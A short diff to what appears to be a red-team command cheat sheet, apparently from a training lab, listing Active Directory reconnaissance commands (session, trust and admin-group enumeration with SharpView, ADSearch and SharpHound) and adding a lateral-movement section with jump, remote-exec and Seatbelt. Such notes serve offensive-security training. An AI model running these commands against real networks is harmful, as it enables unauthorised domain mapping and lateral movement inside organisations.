@@ -22,9 +22,11 @@ powershell Get-NetSession -ComputerName dc-2 | select CName, UserName
 powershell Get-DomainTrust
 
 execute-assembly C:\Tools\SharpView\SharpView\bin\Debug\SharpView.exe Get-Domain
-
 execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
-
 execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly
-
 execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly -d cyberbotic.io
+
+#LATERAL MOVEMENT
+jump
+remote-exec
+execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe powershell -computername=srv-1
